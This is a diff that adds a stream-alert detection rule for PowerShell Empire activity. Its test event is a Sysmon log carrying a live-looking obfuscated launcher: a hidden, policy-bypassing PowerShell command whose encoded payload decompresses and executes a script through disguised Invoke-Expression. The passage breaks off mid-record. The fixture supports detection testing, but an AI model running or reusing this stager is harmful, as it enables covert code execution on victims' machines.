@@ -1,0 +1,352 @@
+version: v1
+kind: stream_alert
+python_rule: "powershell_empire.py"
+kafka_topic: "sysmon"
+enabled: true
+metadata:
+  name: "malicious community_id"
+  MITRE_ATTACK:
+    tactic: Execution
+    tatic_id: TA0002
+    technique: Command and Scripting Interpreter
+    technique_id: T1059
+    sub_technique: PowerShell
+    sub_technique_id: T1059.001
+  MITRE_DEFEND:
+    tactic: Detect
+    tatic_id: D3-Detect
+    technique: Process Analysis
+    technique_id: D3-PA
+    sub_technique: Process Spawn Analysis
+    sub_technique_id: D3-PSA
+  RequiedFields:
+    - process.command_line
+
+tests:
+  - name: True positive - powershell empire
+    result: True
+    event:
+      {
+        "log": {
+          "level": "information"
+        },
+        "user": {
+          "id": "S-1-5-18",
+          "domain": "MAGNUMTEMPUS",
+          "name": "karen.metuens"
+        },
+        "@timestamp": "2022-02-12T21:11:41.899Z",
+        "message": "Process Create:\nRuleName: technique_id=T1047,technique_name=Windows Management Instrumentation\nUtcTime: 2022-02-12 21:11:41.899\nProcessGuid: {D4A1B8F4-228D-6208-6402-000000001002}\nProcessId: 3044\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nFileVersion: 10.0.14393.206 (rs1_release.160915-0644)\nDescription: Windows PowerShell\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: PowerShell.EXE\nCommandLine: powershell -exec bypass -nologo -nop -w hidden -enc KAAgAG4ARQB3AC0AbwBiAGoARQBDAFQAIABJAG8ALgBzAHQAcgBFAEEAbQBSAEUAQQBkAGUAcgAoACAAKABuAEUAdwAtAG8AYgBqAEUAQwBUACAASQBvAC4AYwBvAG0AUABSAGUAcwBTAGkATwBuAC4AZABFAGYAbABBAHQAZQBzAFQAcgBlAEEAbQAoACAAWwBzAFkAUwB0AGUATQAuAEkAbwAuAE0AZQBtAE8AcgBZAHMAdAByAEUAQQBNAF0AIABbAEMAbwBuAFYAZQBSAFQAXQA6ADoARgBSAG8AbQBiAEEAUwBFADYANABzAHQAcgBpAG4ARwAoACAAJwBYAFYAYgBMAGIAbABRADUARQBQADIAVgBXAG8AQQA2AEwAUgB4AGsAWAA3ACsAWABJAEcAVQBCAEMAMABDAEIAeABVAGgAUgBOAEUASQBvAFEARABaAEIAQQBzAFMARwBtAFgAKwBuAFQAagAxADgAYgA1AEMAZwB1ADIATwBYADYAMwBGADgANgBwAFQAcABPAFYAMwBRAHgAYwAyAFAARAA5AGYAMwBiADcANwBjAFAAdgBsADEAOQBmADMAbAAyAC8AZABYADcANgA3AHYAUABsADkAZAAzAHoAMQA4AHUAagB2AGYAcABKAEIAdgBuADUAMwArAE8AVgAyACsAZgBuAHYALwA1AG4AUQA2AHcANQA0AHUAWgBxAEoAQQBmAGYAQgBIAGkAdgBpAFoAVQBxAE4AUQBXAGgAaABaAGwAMABKAEsAUgBaAFkASAAvAHEAeQBCADUAcgBTAE4ARQBZAGsAMwBrAHkAMgBuAEYAUABVADAAZQArAHQAaABkAHUAeABGAHQAdQA1AGkAegBjADcAYwBQAFgAdQBiAE8AVgBEAGwAawBIAFYAdwBtAEUATQBVAEIARgBsAG0AZwBWAHIAZgBrAHkAcQBlAG0AZwBhAEwAbQAvAHgAaQBWADUAeQBOAHgAdABCAE4AVABtAGMAMABoAEkAWABSAFUAQgB2ACsARgBXAEUAVgBrAEoAMgBzAEkARwAxAEoAdQBIAFgAWgBNAEYAdABPAGEAUQA1AFoAZwBOAHMAVQBlAFQATgB6AG8ASgBiAGsASwAyADIAYwBhADAAWQBVAEYAQwBrAFoAcAB0AFEAMQBaAHQAcgBZAGEAdwBVAHkATQBPAEQAMQBLAFMANABhAEoAOQAvAEgAWABzAFUATQBWAEoAQgBRAGgAKwBWAEUAeQBHAGEAYgBjADEAbwBKAGUAVgBOAE0AdABvAFIAQQAxAFQAQQBWAG0AeABTAG4AWABBADEAZgBsAHkAMwB3AFQAdQBFAHoAdwA0AEYAQwA5AG8AQgBOAFMAaQBFAHYAWABtAE4ASAB6AGIAdgBPADgAQwBoAEYAWQBvAGQAOQBVADMAKwBBAEsARQBZADcANABwAGgAWAB0AGEARgBtAFMAQgBxAGMAVgBQAGcARAAvAHkAbQB6AGwAMQBIAGQAVgB1AEcAUQBzAHgAbgBsAFoAagBYAFEAdQBsAHMATgB3AGcAVwBzADYATQA0AEsASgBtAFIAcQB0AHMAVQByAHAAUgB6AGMAZwAxAEsAawBYAE4AdgA4ADUAcQBWAEcAMwBCAHYAdQByAC8AUgBRAHMAeQBTAEsAagA2AEcAbgBTAHIAYgBqAGoASwBtADQARwB0ADIAdgBQADYANQBhAGgAQQBrAEMAZgBnADIAYQBhAE4AWgB2AFAAZwBTAGcAYQBVAGcAcABHADMAWgBRAHoAeQBDAEIASABOAC8AQQBVAG4AWQBVAGYAMgArAEMAeQBnAGYAcQBCAGoAbwBnAE0ARwBlAE0AWQBKAFgAWgBVAGoAZgBIAEkAaABzADYAZABTAHIARABIAHEAZQByADMARABLAE0AYgBHAEUARQBRADEATwBPAGoAWQBVAHUAQQBBAHUAMQBJADQAQgB3AFkANgAvAGQAWQB5AFcAcABuADMAcQBDAHAAVABwAFkAagBQAE0AVgBJAHoAdgBRADQASwBQAHcARgBnADEASAByAGgAbQBsAHIAcQBOAFkATABKAFAAQwA4AFcANAAxAHAAaABrAFUAdwA2ADcASABoAFUAbQB4AEYAawBmAFQAKwBpADEARwBEAGMAUABYAFYAbwBSAGUASABpAFIAcAB4AG8ASgBzAHMANQBaAEIAcABuAEsAeABxAGoAZwBsAFMASgBxAEsASwAvAGMASgArAGwATgBVAEQASgBLAEYAdgArAFUAdQByAFcAdgBRAE4ATQBwAGYAYgBaAHEARAB3AEcAbgBUAG8AQQAvADUAQgByAGQAZABvAEwATAAwADkAVwBKAHkAMQBRADYAYwB1AEIAMABXAEwARwBEAGYAbABrAHgASgBTAFMASQBnAG8AZwBSAEQAdwByAHIAbgBPAFQAUgBsADEANABwAGsAWgBKAEQAZQBQAGoAWQBpAHEAYQBwAEsASwA4AGUARAAzAEIAbABTAFkAbwAvAE4AMQB2AGQATgBLAFMAMQBxAGkAUwA2ADkAMQBoAGsAaQB1AGkAWQBCAG4ARAA1AEUAYQBLAFoAZwA2AEsAeQBlAEYAbgB0AEYANABDAEEAcwBhADgAbABRADgAcABDAHUAUQBKAEUAOABwAEEAdABUAHAAUwBXADMASwBqADYAcQArAFMASgBvADAAYwA2AFIAbwBhAGMAUQBVAGgAdgBtAEIAZgBDAEoATABwAHMARQBpADgAdQAvAGsAagBDAEEARgBBADEASgBwAEEATQBKAEEAOABMAHYANABTADgAawBiAEQAagBvAG4AVgBqAEIAMABtAHoATgA0AEQARgBkAEoANQBFAEcAQwBXAGsANgB4AEIAeABrAFkAeABOAG8AcgBEAGIAWABVAEIAMQA4AHAAdABFAHEAVwBEADQAeABsAFoAKwBxAEkAMQByAHYATQBFAGsALwB6AEsAQgBFAGgALwB5AEUANgBGAEQAVgBZAFQATQBVAFIAWgByAFQAbwBRAFMAMwBhADgAUQBKAEEARQBZACsANQBoAFIAdQB6AHAAcABNAEgAdwBYAG8AeABRAEQAOQAyAEsAeABxAHcAYgB4ADAAZABMAFUAawBNAFUAVQB1AEgANgB1AFEAVQAyAFgAYQBMAEYAVAAxADIAYwBVAEgAbQBlADgAQwA0AE4AWgBBAGUAegAwAGIAVQBNAHEAQgAyADYANQBOAEoAbQBmAFEANwBOAEsAZABuAGUARABPAFUAVwBtADEAUgBCAHUAagBxAEsAcABxADYANgAwAGsAbwBWAGgAQQBSAGsAYQBJAFQAQgBxAGUAawBBAFYAMwBYAEIAYgB0AHAAegBGAGUAeAB3AGYAKwBTAFgAKwBoAEIAdwA4AGoAbgBKAFoATwBpAEgAQwBzADUAdAA2ADcAdwBJAFIAbQBPAHgARABVAGgAMgBuAHkASQBiADMAcQBTAEsAYgA0ADAAcAB0AFYAeAA3AFUAMQBsADkARgB5AEIAaQBYAFIASQBCAHYAcAAwAGcAbgBlAEMATAAzAHAAVABXAHYANwByAEgAbgBhADkARQBrAGoATgBaAEQAcQBvAEEAeAAyAEMAVABPAFAATABMAEkAZQBnAEcATgA3AGoAZgBsAHcAWABQAE4AVQA1AG4AdQBtAHMAQgA1AG8AWQA3ADMAYQArAHIAcQA5AHEASgAyAGgAagB3AFEAWABEAHgAQwB4AEYASgB0ADkAQQBLADUANwBOAFMAMgBzAGgAbABBACsANABvACsAcwA3ADcAbwBtAGMAOQBzAG4ASgBoADUANwBPACsAUgBLAHoAYgBKAGUASgBrAHIAMwBUAEUAYwBQAHQATAB2AHcAWQBXAEEAVABnAGMANwAwAEgAegAzADkAegBZAC8AYwArADQAZQBmAHQALwBUAGsAMwA4AHUAUABQACsAagBtADAAOQBjAFgAMwAyAC8AUAAvADkAUAA1ADgAdgBXADMAVgB3ACsAbgBFADUAMwAvAEEAQQA9AD0AJwAgACkALABbAEkATwAuAEMAbwBNAFAAcgBlAFMAcwBJAG8AbgAuAEMATwBNAFAAUgBlAHMAUwBJAG8ATgBtAG8AZABFAF0AOgA6AGQARQBDAE8AbQBwAHIAZQBzAFMAIAApACkALAAgAFsAVABlAHgAVAAuAEUATgBDAG8AZABJAG4AZwBdADoAOgBhAFMAYwBJAGkAKQAgACkALgByAGUAQQBkAFQATwBlAG4AZAAoACAAKQAgAHwAIAAuACAAKAAgACQAUwBIAGUATABsAEkARABbADEAXQArACQAcwBoAGUATABsAEkAZABbADEAMwBdACsAJwBYACcAKQA=\nCurrentDirectory: C:\\Windows\\system32\\\nUser: MAGNUMTEMPUS\\karen.metuens\nLogonGuid: {D4A1B8F4-02C8-6208-7BDE-0A0000000000}\nLogonId: 0xADE7B\nTerminalSessionId: 2\nIntegrityLevel: Medium\nHashes: SHA1=044A0CF1F6BC478A7172BF207EEF1E201A18BA02,MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453\nParentProcessGuid: {D4A1B8F4-00C4-6208-3100-000000001002}\nParentProcessId: 2732\nParentImage: C:\\Windows\\System32\\wbem\\WmiPrvSE.exe\nParentCommandLine: C:\\Windows\\system32\\wbem\\wmiprvse.exe\nParentUser: NT AUTHORITY\\NETWORK SERVICE",
+        "agent": {
+          "id": "ede5221c-9b85-4b9c-a9df-65d46bd0af04",
+          "ephemeral_id": "d03d1ef6-3607-4855-8c26-5f442d35d52d",
+          "type": "winlogbeat",
+          "hostname": "wkst02",
+          "version": "7.16.2",
+          "name": "wkst02"
+        },
+        "event": {
+          "type": [
+            "start",
+            "process_start"
+          ],
+          "provider": "Microsoft-Windows-Sysmon",
+          "kind": "event",
+          "code": "1",
+          "action": "Process Create (rule: ProcessCreate)",
+          "module": "sysmon",
+          "created": "2022-02-12T21:11:42.808Z",
+          "category": [
+            "process"
+          ]
+        },
+        "tags": [
+          "sysmon",
+          "beats_input_codec_plain_applied"
+        ],
+        "winlog": {
+          "event_data": {
+            "LogonGuid": "{D4A1B8F4-02C8-6208-7BDE-0A0000000000}",
+            "FileVersion": "10.0.14393.206 (rs1_release.160915-0644)",
+            "Product": "Microsoft® Windows® Operating System",
+            "Company": "Microsoft Corporation",
+            "IntegrityLevel": "Medium",
+            "Description": "Windows PowerShell",
+            "TerminalSessionId": "2",
+            "LogonId": "0xade7b",
+            "ParentUser": "NT AUTHORITY\\NETWORK SERVICE"
+          },
+          "user": {
+            "domain": "NT AUTHORITY",
+            "name": "SYSTEM",
+            "type": "User",
+            "identifier": "S-1-5-18"
+          },
+          "computer_name": "wkst02.magnumtempus.financial",
+          "api": "wineventlog",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": "1",
+          "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+          "opcode": "Info",
+          "task": "Process Create (rule: ProcessCreate)",
+          "record_id": 38616,
+          "version": 5,
+          "process": {
+            "pid": 1996,
+            "thread": {
+              "id": 2848
+            }
+          },
+          "provider_name": "Microsoft-Windows-Sysmon"
+        },
+        "@version": "1",
+        "process": {
+          "pe": {
+            "imphash": "caee994f79d85e47c06e5fa9cdeae453",
+            "original_file_name": "PowerShell.EXE",
+            "description": "Windows PowerShell",
+            "company": "Microsoft Corporation",
+            "product": "Microsoft® Windows® Operating System",
+            "file_version": "10.0.14393.206 (rs1_release.160915-0644)"
+          },
+          "pid": 3044,
+          "hash": {
+            "sha1": "044a0cf1f6bc478a7172bf207eef1e201a18ba02",
+            "sha256": "ba4038fd20e474c047be8aad5bfacdb1bfc1ddbe12f803f473b7918d8d819436",
+            "md5": "097ce5761c89434367598b34fe32893b"
+          },
+          "args": [
+            "powershell",
+            "-exec",
+            "bypass",
+            "-nologo",
+            "-nop",
+            "-w",
+            "hidden",
+            "-enc",
+            "KAAgAG4ARQB3AC0AbwBiAGoARQBDAFQAIABJAG8ALgBzAHQAcgBFAEEAbQBSAEUAQQBkAGUAcgAoACAAKABuAEUAdwAtAG8AYgBqAEUAQwBUACAASQBvAC4AYwBvAG0AUABSAGUAcwBTAGkATwBuAC4AZABFAGYAbABBAHQAZQBzAFQAcgBlAEEAbQAoACAAWwBzAFkAUwB0AGUATQAuAEkAbwAuAE0AZQBtAE8AcgBZAHMAdAByAEUAQQBNAF0AIABbAEMAbwBuAFYAZQBSAFQAXQA6ADoARgBSAG8AbQBiAEEAUwBFADYANABzAHQAcgBpAG4ARwAoACAAJwBYAFYAYgBMAGIAbABRADUARQBQADIAVgBXAG8AQQA2AEwAUgB4AGsAWAA3ACsAWABJAEcAVQBCAEMAMABDAEIAeABVAGgAUgBOAEUASQBvAFEARABaAEIAQQBzAFMARwBtAFgAKwBuAFQAagAxADgAYgA1AEMAZwB1ADIATwBYADYAMwBGADgANgBwAFQAcABPAFYAMwBRAHgAYwAyAFAARAA5AGYAMwBiADcANwBjAFAAdgBsADEAOQBmADMAbAAyAC8AZABYADcANgA3AHYAUABsADkAZAAzAHoAMQA4AHUAagB2AGYAcABKAEIAdgBuADUAMwArAE8AVgAyACsAZgBuAHYALwA1AG4AUQA2AHcANQA0AHUAWgBxAEoAQQBmAGYAQgBIAGkAdgBpAFoAVQBxAE4AUQBXAGgAaABaAGwAMABKAEsAUgBaAFkASAAvAHEAeQBCADUAcgBTAE4ARQBZAGsAMwBrAHkAMgBuAEYAUABVADAAZQArAHQAaABkAHUAeABGAHQAdQA1AGkAegBjADcAYwBQAFgAdQBiAE8AVgBEAGwAawBIAFYAdwBtAEUATQBVAEIARgBsAG0AZwBWAHIAZgBrAHkAcQBlAG0AZwBhAEwAbQAvAHgAaQBWADUAeQBOAHgAdABCAE4AVABtAGMAMABoAEkAWABSAFUAQgB2ACsARgBXAEUAVgBrAEoAMgBzAEkARwAxAEoAdQBIAFgAWgBNAEYAdABPAGEAUQA1AFoAZwBOAHMAVQBlAFQATgB6AG8ASgBiAGsASwAyADIAYwBhADAAWQBVAEYAQwBrAFoAcAB0AFEAMQBaAHQAcgBZAGEAdwBVAHkATQBPAEQAMQBLAFMANABhAEoAOQAvAEgAWABzAFUATQBWAEoAQgBRAGgAKwBWAEUAeQBHAGEAYgBjADEAbwBKAGUAVgBOAE0AdABvAFIAQQAxAFQAQQBWAG0AeABTAG4AWABBADEAZgBsAHkAMwB3AFQAdQBFAHoAdwA0AEYAQwA5AG8AQgBOAFMAaQBFAHYAWABtAE4ASAB6AGIAdgBPADgAQwBoAEYAWQBvAGQAOQBVADMAKwBBAEsARQBZADcANABwAGgAWAB0AGEARgBtAFMAQgBxAGMAVgBQAGcARAAvAHkAbQB6AGwAMQBIAGQAVgB1AEcAUQBzAHgAbgBsAFoAagBYAFEAdQBsAHMATgB3AGcAVwBzADYATQA0AEsASgBtAFIAcQB0AHMAVQByAHAAUgB6AGMAZwAxAEsAawBYAE4AdgA4ADUAcQBWAEcAMwBCAHYAdQByAC8AUgBRAHMAeQBTAEsAagA2AEcAbgBTAHIAYgBqAGoASwBtADQARwB0ADIAdgBQADYANQBhAGgAQQBrAEMAZgBnADIAYQBhAE4AWgB2AFAAZwBTAGcAYQBVAGcAcABHADMAWgBRAHoAeQBDAEIASABOAC8AQQBVAG4AWQBVAGYAMgArAEMAeQBnAGYAcQBCAGoAbwBnAE0ARwBlAE0AWQBKAFgAWgBVAGoAZgBIAEkAaABzADYAZABTAHIARABIAHEAZQByADMARABLAE0AYgBHAEUARQBRADEATwBPAGoAWQBVAHUAQQBBAHUAMQBJADQAQgB3AFkANgAvAGQAWQB5AFcAcABuADMAcQBDAHAAVABwAFkAagBQAE0AVgBJAHoAdgBRADQASwBQAHcARgBnADEASAByAGgAbQBsAHIAcQBOAFkATABKAFAAQwA4AFcANAAxAHAAaABrAFUAdwA2ADcASABoAFUAbQB4AEYAawBmAFQAKwBpADEARwBEAGMAUABYAFYAbwBSAGUASABpAFIAcAB4AG8ASgBzAHMANQBaAEIAcABuAEsAeABxAGoAZwBsAFMASgBxAEsASwAvAGMASgArAGwATgBVAEQASgBLAEYAdgArAFUAdQByAFcAdgBRAE4ATQBwAGYAYgBaAHEARAB3AEcAbgBUAG8AQQAvADUAQgByAGQAZABvAEwATAAwADkAVwBKAHkAMQBRADYAYwB1AEIAMABXAEwARwBEAGYAbABrAHgASgBTAFMASQBnAG8AZwBSAEQAdwByAHIAbgBPAFQAUgBsADEANABwAGsAWgBKAEQAZQBQAGoAWQBpAHEAYQBwAEsASwA4AGUARAAzAEIAbABTAFkAbwAvAE4AMQB2AGQATgBLAFMAMQBxAGkAUwA2ADkAMQBoAGsAaQB1AGkAWQBCAG4ARAA1AEUAYQBLAFoAZwA2AEsAeQBlAEYAbgB0AEYANABDAEEAcwBhADgAbABRADgAcABDAHUAUQBKAEUAOABwAEEAdABUAHAAUwBXADMASwBqADYAcQArAFMASgBvADAAYwA2AFIAbwBhAGMAUQBVAGgAdgBtAEIAZgBDAEoATABwAHMARQBpADgAdQAvAGsAagBDAEEARgBBADEASgBwAEEATQBKAEEAOABMAHYANABTADgAawBiAEQAagBvAG4AVgBqAEIAMABtAHoATgA0AEQARgBkAEoANQBFAEcAQwBXAGsANgB4AEIAeABrAFkAeABOAG8AcgBEAGIAWABVAEIAMQA4AHAAdABFAHEAVwBEADQAeABsAFoAKwBxAEkAMQByAHYATQBFAGsALwB6AEsAQgBFAGgALwB5AEUANgBGAEQAVgBZAFQATQBVAFIAWgByAFQAbwBRAFMAMwBhADgAUQBKAEEARQBZACsANQBoAFIAdQB6AHAAcABNAEgAdwBYAG8AeABRAEQAOQAyAEsAeABxAHcAYgB4ADAAZABMAFUAawBNAFUAVQB1AEgANgB1AFEAVQAyAFgAYQBMAEYAVAAxADIAYwBVAEgAbQBlADgAQwA0AE4AWgBBAGUAegAwAGIAVQBNAHEAQgAyADYANQBOAEoAbQBmAFEANwBOAEsAZABuAGUARABPAFUAVwBtADEAUgBCAHUAagBxAEsAcABxADYANgAwAGsAbwBWAGgAQQBSAGsAYQBJAFQAQgBxAGUAawBBAFYAMwBYAEIAYgB0AHAAegBGAGUAeAB3AGYAKwBTAFgAKwBoAEIAdwA4AGoAbgBKAFoATwBpAEgAQwBzADUAdAA2ADcAdwBJAFIAbQBPAHgARABVAGgAMgBuAHkASQBiADMAcQBTAEsAYgA0ADAAcAB0AFYAeAA3AFUAMQBsADkARgB5AEIAaQBYAFIASQBCAHYAcAAwAGcAbgBlAEMATAAzAHAAVABXAHYANwByAEgAbgBhADkARQBrAGoATgBaAEQAcQBvAEEAeAAyAEMAVABPAFAATABMAEkAZQBnAEcATgA3AGoAZgBsAHcAWABQAE4AVQA1AG4AdQBtAHMAQgA1AG8AWQA3ADMAYQArAHIAcQA5AHEASgAyAGgAagB3AFEAWABEAHgAQwB4AEYASgB0ADkAQQBLADUANwBOAFMAMgBzAGgAbABBACsANABvACsAcwA3ADcAbwBtAGMAOQBzAG4ASgBoADUANwBPACsAUgBLAHoAYgBKAGUASgBrAHIAMwBUAEUAYwBQAHQATAB2AHcAWQBXAEEAVABnAGMANwAwAEgAegAzADkAegBZAC8AYwArADQAZQBmAHQALwBUAGsAMwA4AHUAUABQACsAagBtADAAOQBjAFgAMwAyAC8AUAAvADkAUAA1ADgAdgBXADMAVgB3ACsAbgBFADUAMwAvAEEAQQA9AD0AJwAgACkALABbAEkATwAuAEMAbwBNAFAAcgBlAFMAcwBJAG8AbgAuAEMATwBNAFAAUgBlAHMAUwBJAG8ATgBtAG8AZABFAF0AOgA6AGQARQBDAE8AbQBwAHIAZQBzAFMAIAApACkALAAgAFsAVABlAHgAVAAuAEUATgBDAG8AZABJAG4AZwBdADoAOgBhAFMAYwBJAGkAKQAgACkALgByAGUAQQBkAFQATwBlAG4AZAAoACAAKQAgAHwAIAAuACAAKAAgACQAUwBIAGUATABsAEkARABbADEAXQArACQAcwBoAGUATABsAEkAZABbADEAMwBdACsAJwBYACcAKQA="
+          ],
+          "entity_id": "{D4A1B8F4-228D-6208-6402-000000001002}",
+          "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "working_directory": "C:\\Windows\\system32\\",
+          "name": "powershell.exe",
+          "command_line": "powershell -exec bypass -nologo -nop -w hidden -enc KAAgAG4ARQB3AC0AbwBiAGoARQBDAFQAIABJAG8ALgBzAHQAcgBFAEEAbQBSAEUAQQBkAGUAcgAoACAAKABuAEUAdwAtAG8AYgBqAEUAQwBUACAASQBvAC4AYwBvAG0AUABSAGUAcwBTAGkATwBuAC4AZABFAGYAbABBAHQAZQBzAFQAcgBlAEEAbQAoACAAWwBzAFkAUwB0AGUATQAuAEkAbwAuAE0AZQBtAE8AcgBZAHMAdAByAEUAQQBNAF0AIABbAEMAbwBuAFYAZQBSAFQAXQA6ADoARgBSAG8AbQBiAEEAUwBFADYANABzAHQAcgBpAG4ARwAoACAAJwBYAFYAYgBMAGIAbABRADUARQBQADIAVgBXAG8AQQA2AEwAUgB4AGsAWAA3ACsAWABJAEcAVQBCAEMAMABDAEIAeABVAGgAUgBOAEUASQBvAFEARABaAEIAQQBzAFMARwBtAFgAKwBuAFQAagAxADgAYgA1AEMAZwB1ADIATwBYADYAMwBGADgANgBwAFQAcABPAFYAMwBRAHgAYwAyAFAARAA5AGYAMwBiADcANwBjAFAAdgBsADEAOQBmADMAbAAyAC8AZABYADcANgA3AHYAUABsADkAZAAzAHoAMQA4AHUAagB2AGYAcABKAEIAdgBuADUAMwArAE8AVgAyACsAZgBuAHYALwA1AG4AUQA2AHcANQA0AHUAWgBxAEoAQQBmAGYAQgBIAGkAdgBpAFoAVQBxAE4AUQBXAGgAaABaAGwAMABKAEsAUgBaAFkASAAvAHEAeQBCADUAcgBTAE4ARQBZAGsAMwBrAHkAMgBuAEYAUABVADAAZQArAHQAaABkAHUAeABGAHQAdQA1AGkAegBjADcAYwBQAFgAdQBiAE8AVgBEAGwAawBIAFYAdwBtAEUATQBVAEIARgBsAG0AZwBWAHIAZgBrAHkAcQBlAG0AZwBhAEwAbQAvAHgAaQBWADUAeQBOAHgAdABCAE4AVABtAGMAMABoAEkAWABSAFUAQgB2ACsARgBXAEUAVgBrAEoAMgBzAEkARwAxAEoAdQBIAFgAWgBNAEYAdABPAGEAUQA1AFoAZwBOAHMAVQBlAFQATgB6AG8ASgBiAGsASwAyADIAYwBhADAAWQBVAEYAQwBrAFoAcAB0AFEAMQBaAHQAcgBZAGEAdwBVAHkATQBPAEQAMQBLAFMANABhAEoAOQAvAEgAWABzAFUATQBWAEoAQgBRAGgAKwBWAEUAeQBHAGEAYgBjADEAbwBKAGUAVgBOAE0AdABvAFIAQQAxAFQAQQBWAG0AeABTAG4AWABBADEAZgBsAHkAMwB3AFQAdQBFAHoAdwA0AEYAQwA5AG8AQgBOAFMAaQBFAHYAWABtAE4ASAB6AGIAdgBPADgAQwBoAEYAWQBvAGQAOQBVADMAKwBBAEsARQBZADcANABwAGgAWAB0AGEARgBtAFMAQgBxAGMAVgBQAGcARAAvAHkAbQB6AGwAMQBIAGQAVgB1AEcAUQBzAHgAbgBsAFoAagBYAFEAdQBsAHMATgB3AGcAVwBzADYATQA0AEsASgBtAFIAcQB0AHMAVQByAHAAUgB6AGMAZwAxAEsAawBYAE4AdgA4ADUAcQBWAEcAMwBCAHYAdQByAC8AUgBRAHMAeQBTAEsAagA2AEcAbgBTAHIAYgBqAGoASwBtADQARwB0ADIAdgBQADYANQBhAGgAQQBrAEMAZgBnADIAYQBhAE4AWgB2AFAAZwBTAGcAYQBVAGcAcABHADMAWgBRAHoAeQBDAEIASABOAC8AQQBVAG4AWQBVAGYAMgArAEMAeQBnAGYAcQBCAGoAbwBnAE0ARwBlAE0AWQBKAFgAWgBVAGoAZgBIAEkAaABzADYAZABTAHIARABIAHEAZQByADMARABLAE0AYgBHAEUARQBRADEATwBPAGoAWQBVAHUAQQBBAHUAMQBJADQAQgB3AFkANgAvAGQAWQB5AFcAcABuADMAcQBDAHAAVABwAFkAagBQAE0AVgBJAHoAdgBRADQASwBQAHcARgBnADEASAByAGgAbQBsAHIAcQBOAFkATABKAFAAQwA4AFcANAAxAHAAaABrAFUAdwA2ADcASABoAFUAbQB4AEYAawBmAFQAKwBpADEARwBEAGMAUABYAFYAbwBSAGUASABpAFIAcAB4AG8ASgBzAHMANQBaAEIAcABuAEsAeABxAGoAZwBsAFMASgBxAEsASwAvAGMASgArAGwATgBVAEQASgBLAEYAdgArAFUAdQByAFcAdgBRAE4ATQBwAGYAYgBaAHEARAB3AEcAbgBUAG8AQQAvADUAQgByAGQAZABvAEwATAAwADkAVwBKAHkAMQBRADYAYwB1AEIAMABXAEwARwBEAGYAbABrAHgASgBTAFMASQBnAG8AZwBSAEQAdwByAHIAbgBPAFQAUgBsADEANABwAGsAWgBKAEQAZQBQAGoAWQBpAHEAYQBwAEsASwA4AGUARAAzAEIAbABTAFkAbwAvAE4AMQB2AGQATgBLAFMAMQBxAGkAUwA2ADkAMQBoAGsAaQB1AGkAWQBCAG4ARAA1AEUAYQBLAFoAZwA2AEsAeQBlAEYAbgB0AEYANABDAEEAcwBhADgAbABRADgAcABDAHUAUQBKAEUAOABwAEEAdABUAHAAUwBXADMASwBqADYAcQArAFMASgBvADAAYwA2AFIAbwBhAGMAUQBVAGgAdgBtAEIAZgBDAEoATABwAHMARQBpADgAdQAvAGsAagBDAEEARgBBADEASgBwAEEATQBKAEEAOABMAHYANABTADgAawBiAEQAagBvAG4AVgBqAEIAMABtAHoATgA0AEQARgBkAEoANQBFAEcAQwBXAGsANgB4AEIAeABrAFkAeABOAG8AcgBEAGIAWABVAEIAMQA4AHAAdABFAHEAVwBEADQAeABsAFoAKwBxAEkAMQByAHYATQBFAGsALwB6AEsAQgBFAGgALwB5AEUANgBGAEQAVgBZAFQATQBVAFIAWgByAFQAbwBRAFMAMwBhADgAUQBKAEEARQBZACsANQBoAFIAdQB6AHAAcABNAEgAdwBYAG8AeABRAEQAOQAyAEsAeABxAHcAYgB4ADAAZABMAFUAawBNAFUAVQB1AEgANgB1AFEAVQAyAFgAYQBMAEYAVAAxADIAYwBVAEgAbQBlADgAQwA0AE4AWgBBAGUAegAwAGIAVQBNAHEAQgAyADYANQBOAEoAbQBmAFEANwBOAEsAZABuAGUARABPAFUAVwBtADEAUgBCAHUAagBxAEsAcABxADYANgAwAGsAbwBWAGgAQQBSAGsAYQBJAFQAQgBxAGUAawBBAFYAMwBYAEIAYgB0AHAAegBGAGUAeAB3AGYAKwBTAFgAKwBoAEIAdwA4AGoAbgBKAFoATwBpAEgAQwBzADUAdAA2ADcAdwBJAFIAbQBPAHgARABVAGgAMgBuAHkASQBiADMAcQBTAEsAYgA0ADAAcAB0AFYAeAA3AFUAMQBsADkARgB5AEIAaQBYAFIASQBCAHYAcAAwAGcAbgBlAEMATAAzAHAAVABXAHYANwByAEgAbgBhADkARQBrAGoATgBaAEQAcQBvAEEAeAAyAEMAVABPAFAATABMAEkAZQBnAEcATgA3AGoAZgBsAHcAWABQAE4AVQA1AG4AdQBtAHMAQgA1AG8AWQA3ADMAYQArAHIAcQA5AHEASgAyAGgAagB3AFEAWABEAHgAQwB4AEYASgB0ADkAQQBLADUANwBOAFMAMgBzAGgAbABBACsANABvACsAcwA3ADcAbwBtAGMAOQBzAG4ASgBoADUANwBPACsAUgBLAHoAYgBKAGUASgBrAHIAMwBUAEUAYwBQAHQATAB2AHcAWQBXAEEAVABnAGMANwAwAEgAegAzADkAegBZAC8AYwArADQAZQBmAHQALwBUAGsAMwA4AHUAUABQACsAagBtADAAOQBjAFgAMwAyAC8AUAAvADkAUAA1ADgAdgBXADMAVgB3ACsAbgBFADUAMwAvAEEAQQA9AD0AJwAgACkALABbAEkATwAuAEMAbwBNAFAAcgBlAFMAcwBJAG8AbgAuAEMATwBNAFAAUgBlAHMAUwBJAG8ATgBtAG8AZABFAF0AOgA6AGQARQBDAE8AbQBwAHIAZQBzAFMAIAApACkALAAgAFsAVABlAHgAVAAuAEUATgBDAG8AZABJAG4AZwBdADoAOgBhAFMAYwBJAGkAKQAgACkALgByAGUAQQBkAFQATwBlAG4AZAAoACAAKQAgAHwAIAAuACAAKAAgACQAUwBIAGUATABsAEkARABbADEAXQArACQAcwBoAGUATABsAEkAZABbADEAMwBdACsAJwBYACcAKQA=",
+          "parent": {
+            "pid": 2732,
+            "entity_id": "{D4A1B8F4-00C4-6208-3100-000000001002}",
+            "executable": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+            "name": "WmiPrvSE.exe",
+            "args": [
+              "C:\\Windows\\system32\\wbem\\wmiprvse.exe"
+            ],
+            "command_line": "C:\\Windows\\system32\\wbem\\wmiprvse.exe"
+          }
+        },
+        "related": {
